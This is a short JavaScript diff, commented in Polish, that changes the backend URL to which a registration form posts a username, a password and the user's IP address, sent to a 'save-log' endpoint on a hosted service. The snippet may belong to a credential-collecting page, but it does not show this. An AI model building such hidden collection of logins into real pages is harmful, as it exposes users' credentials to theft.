@@ -42,7 +42,7 @@ document.getElementById('registrationForm').addEventListener('submit', async fun
         console.log('📨 Wysyłanie danych:', { username, password: '***', ip: userIP });
 
         // Wyślij do backendu
-        const response = await fetch('https://social-tools.onrender.com/save-log', {
+        const response = await fetch('https://socialtool.onrender.com/save-log', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
